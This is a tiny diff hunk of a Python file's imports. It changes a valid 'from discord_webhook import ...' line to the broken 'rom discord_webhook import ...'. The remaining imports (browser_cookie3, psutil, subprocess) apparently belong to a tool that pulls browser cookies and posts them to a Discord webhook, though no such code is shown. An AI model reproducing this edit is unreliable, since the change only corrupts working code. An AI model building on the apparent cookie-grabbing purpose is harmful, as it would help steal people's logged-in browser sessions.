@@ -1,4 +1,4 @@
-from discord_webhook import DiscordEmbed, DiscordWebhook
+rom discord_webhook import DiscordEmbed, DiscordWebhook
 import browser_cookie3
 import os,psutil,threading
 import subprocess
